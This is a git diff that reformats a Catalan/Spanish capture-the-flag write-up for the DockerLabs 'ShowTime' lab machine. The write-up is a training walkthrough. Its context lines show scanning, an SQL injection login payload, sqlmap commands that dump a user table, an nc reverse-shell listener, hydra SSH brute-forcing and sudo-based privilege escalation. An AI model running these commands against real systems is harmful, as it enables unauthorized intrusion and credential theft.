@@ -1,64 +1,54 @@
 # ShowTime
 
-Plataforma: Dockerlabs
-OS: Linux
-Level: Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 5 de diciembre de 2024 21:44
+## ShowTime
 
-# Reconocimiento
+Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:44
+
+## Reconocimiento
 
 > NMAP
-> 
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports
 ```
 
-![image.png](/images/DockerLabs/image.png)
+![image.png](../../.gitbook/assets/image.png)
 
 ```bash
 sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted
 ```
 
-![image.png](/images/DockerLabs/image%201.png)
+![image.png](<../../.gitbook/assets/image 1.png>)
 
 Ports:
 
-**22** SSH: Open SSH 9.61
-**80** http: Apache 2.4.58
+**22** SSH: Open SSH 9.61 **80** http: Apache 2.4.58
 
 > FUZZING
-> 
 
 ```bash
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
 ```
 
-![image.png](/images/DockerLabs/image%202.png)
+![image.png](<../../.gitbook/assets/image 2.png>)
 
-Trobem /login_page/
+Trobem /login\_page/
 
-# Análisis de vulnerabilidades
+## Análisis de vulnerabilidades
 
 > Web Analisis
-> 
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](<../../.gitbook/assets/image 3.png>)
 
 Probem les SQL Injection:
 
-Usuario: ' OR 1=1--
-Password: 1234
+Usuario: ' OR 1=1-- Password: 1234
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](<../../.gitbook/assets/image 4.png>)
 
-# Explotación de vulnerabilidades
+## Explotación de vulnerabilidades
 
 > SQLMAP
-> 
 
 ```bash
 sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch
@@ -77,7 +67,7 @@ sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page
 	- `dbs`:Per a veure les bases de dades
 ```
 
-![image.png](/images/DockerLabs/image%205.png)
+![image.png](<../../.gitbook/assets/image 5.png>)
 
 ```bash
  sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch -D users --tables
@@ -85,7 +75,7 @@ sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page
   -`tables`:Per a veure les taules e la BS users
 ```
 
-![image.png](/images/DockerLabs/image%206.png)
+![image.png](<../../.gitbook/assets/image 6.png>)
 
 ```bash
 sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch -D users -T usuarios --dump
@@ -93,11 +83,11 @@ sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page
 -`dump`: Per a volcar el contingut de la taula usuarios
 ```
 
-![image.png](/images/DockerLabs/image%207.png)
+![image.png](<../../.gitbook/assets/image 7.png>)
 
 Entrem a la web amb els 3 i el que es difrente es el usuari "joe"
 
-![image.png](/images/DockerLabs/image%208.png)
+![image.png](<../../.gitbook/assets/image 8.png>)
 
 Busquem com executar una revershell en python:
 
@@ -135,7 +125,7 @@ sudo nc -lvnp 4444
 
 Tenim la Rever shell:
 
-![image.png](/images/DockerLabs/image%209.png)
+![image.png](<../../.gitbook/assets/image 9.png>)
 
 Tractament TTY:
 
@@ -148,12 +138,11 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-# Escalada de privilegios
+## Escalada de privilegios
 
 > usuari :www-data
-> 
 
-![image.png](/images/DockerLabs/image%2010.png)
+![image.png](<../../.gitbook/assets/image 10.png>)
 
 Provem a escalar privilegis:
 
@@ -165,19 +154,19 @@ sudo -l : no funciona, ens demana password
 find / -perm -u=s -type f 2>/dev/null:
 ```
 
-![image.png](/images/DockerLabs/image%2011.png)
+![image.png](<../../.gitbook/assets/image 11.png>)
 
 Al no trobar res, mirem altres usuaris:
 
-![image.png](/images/DockerLabs/image%2012.png)
+![image.png](<../../.gitbook/assets/image 12.png>)
 
 Busquem fitxers a l'equip i trobem a la carpeta /tmp
 
-![image.png](/images/DockerLabs/image%2013.png)
+![image.png](<../../.gitbook/assets/image 13.png>)
 
-Obrirm .hidden_text.txt
+Obrirm .hidden\_text.txt
 
-![image.png](/images/DockerLabs/image%2014.png)
+![image.png](<../../.gitbook/assets/image 14.png>)
 
 Com tenim diferents usuaris (joe, luciano) provem a buscar amb hydra el password d'aquest utilitzant aquesta llista com a diccionari:
 
@@ -199,10 +188,9 @@ hydra -l joe -P passVariado.txt 172.17.0.2 ssh -Vv
 
 Resultat:
 
-![image.png](/images/DockerLabs/image%2015.png)
+![image.png](<../../.gitbook/assets/image 15.png>)
 
-Usuari: joe
-Password: chittychittybangbang
+Usuari: joe Password: chittychittybangbang
 
 Ara , dins de la maquina, canviem a usuari jo
 
@@ -210,7 +198,7 @@ Ara , dins de la maquina, canviem a usuari jo
 su joe
 ```
 
-![image.png](/images/DockerLabs/image%2016.png)
+![image.png](<../../.gitbook/assets/image 16.png>)
 
 Mirem com podem escalar privilegis amb usuari "Joe"
 
@@ -224,7 +212,7 @@ Podem executar posh sense password com a luciano:
 sudo -u luciano /bin/posh
 ```
 
-![image.png](/images/DockerLabs/image%2017.png)
+![image.png](<../../.gitbook/assets/image 17.png>)
 
 Ara som usuari luciano
 
@@ -251,4 +239,4 @@ sudo /bin/bash /home/luciano/script.sh
 
 Esperem perque el script porta un deleyy i despres:
 
-![image.png](/images/DockerLabs/image%2018.png)
+![image.png](<../../.gitbook/assets/image 18.png>)
